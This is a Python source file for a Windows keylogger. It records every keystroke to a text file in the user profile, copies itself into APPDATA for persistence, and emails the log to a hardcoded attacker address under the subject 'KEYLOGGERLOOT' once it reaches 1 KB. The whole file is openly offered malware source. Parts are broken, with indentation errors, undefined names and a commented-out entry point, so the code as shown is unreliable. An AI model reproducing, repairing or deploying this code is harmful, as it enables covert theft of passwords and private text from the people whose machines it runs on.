"""
KEYLOOGGER FOR WINDOWS
CTX => reads from the keyboard input stream then dumps data into 
a text file.
key is : pynput.keyboard._win32.KeyCode || <enum key>
"""

from pynput.keyboard import Listener
from os import environ
from colorama import Fore
from sys import exit, platform, argv
from os import getcwd, getenv, name
from base64 import b85decode, b32decode
from shutil import copy
from email.message import EmailMessage
from os import environ 
import smtplib
from time import sleep

class MessageSettingError(Exception):
	pass

DEBUG_MODE = {
	'port': 1025,
	'server': "localhost:1025"
}

E_ = "UR EMAIL"

# if you want to hide info you can obfuscate the email and password using base16/32/64

P_ = "PASSKEY"

class EmailSender:
	def __init__(self, 
		address,
		password,
		msg: EmailMessage = EmailMessage(), PORT: int = 465,
		agent: str = 'smtp.gmail.com',
		Debug: bool = False
		) -> None:

		self.address = address
		self.password = password
		self.PORT = PORT
		self.msg = msg
		self.agent = agent
		self.Debug = Debug
		if self.Debug == False:
			pass
		else:
			self.PORT = DEBUG_MODE['port']
			self.agent = DEBUG_MODE['server']
	def __str__(self) -> str:
		return f"""

	Port: {self.PORT}
	agent: {self.agent}
	subject: {self.msg['Subject']}
	from: {self.address}
	to: {self.msg['To']}
		"""
	
	
	def setMessage(self, 
		subject: str, 
		to: str, 
		content: str
		) -> bool:
		"""
		setting the message headers and reciever
		do not run the send method before configuring everything
		"""
		try:
			
			self.msg['Subject'] = subject
			self.msg['From'] = self.address 
			self.msg['To'] = to
			self.msg.set_content(content)
		except Exception as e:
			print(e)
		return True
	def attach(self, filename, filetype):
		with open(filename, 'rb') as f:
	        file_data = f.read()
	        file_type =  file.name.split('.')[1]
	        file_name = f.name
	   	email.msg.add_attachment(file_data, maintype=filetype, subtype=file_type, filename=file_name)
	def send(self) -> bool:
		with smtplib.SMTP_SSL(self.agent, self.PORT) as S:
			S.login(self.address, self.password)
			try:
				S.send_message(self.msg)
				print(f"The message was sent to {self.msg['to']}")
			except:
				if self.msg['To'] is None and self.msg['Subject'] is None:
					print("""
	you have not set the message headers, Subject and to
	you can use instance.setMessage(Subject, to, content)
	""")	
				elif self.msg['To'] is None | self.msg['Subject'] is None:
					print("check your setMessage() functions seems like you have not set important headers")
				else:
					raise messageSettingError("you have forgotten to set some important data in the setMessage function")
		return False


startUpShell = getenv("APPDATA")
file = environ.get("USERPROFILE") + "\\logger.txt"
print(f"{Fore.RED}[!] kEYLOGGING")


def process(key):
	
	if hasattr(key, 'char'):
		return key.char
	elif key == key.space:
		return ' '
	elif key == key.enter:
		return '\n'
	elif key == key.tab:
		return '\t'
	elif key in [
	key.shift,
	key.up,
	key.left,
	key.down,
	key.right,
	key.page_down,
	key.page_up,
	key.end,
	key.home,
	key.caps_lock,
	key.shift_r,
	key.ctrl_r,
	key.ctrl_l,
	key.alt_gr,
	key.alt_l,
	key.ctrl_l
	]:
		return  ' '
	else:
		if str(key):
			return str(key)
		else:
			return ' '


def rerun():
	sleep(60)
	system(f"cd {startUpShell} && keylogger.exe")

def fileSize(name: str) -> int:
	with open(name, 'rb') as f:
		return len(f.read())
def sendFile(file: str):
	email = EmailSender(EMAIL_ADRESS, PASSWORD,Debug=False) # constructing the instance, you can change the PORT and the agent tho
	print(email)
	email.setMessage('KEYLOGGERLOOT', "EMAIL YOU WANT TO SEND DATA TO", f"Something from {environ.get("USERPROFILE").split('\\')[-1]} key log")
	email.attach(file, "textfile")
	email.send()

class SetUp:
	if startUpShell != getcwd():
		copy(__file__, startUpShell)
	else:
		pass
def on_press(key):
	if name == 'nt':
		if fileSize(file) < 1024:
			if len(argv) > 1:
				if process(key) == "\x03":
					exit()
				else:
					with open(file, 'a') as f:
						f.write(process(key))

			else:
				with open(file, 'a') as f:
					f.write(process(key))
		else:
			try:
				sendFile(file)
			except:
				pass
			rerun()

	else:
		exit()

def main():
	try:
		SetUp()
		try:
			with Listener(on_press=on_press) as l:
			    l.join()
			    print(Fore.RESET)
		except Exception as e:
			print(f"{Fore.RESET}")
	except:
		rerun()

if __name__ == '__main__':
	# main()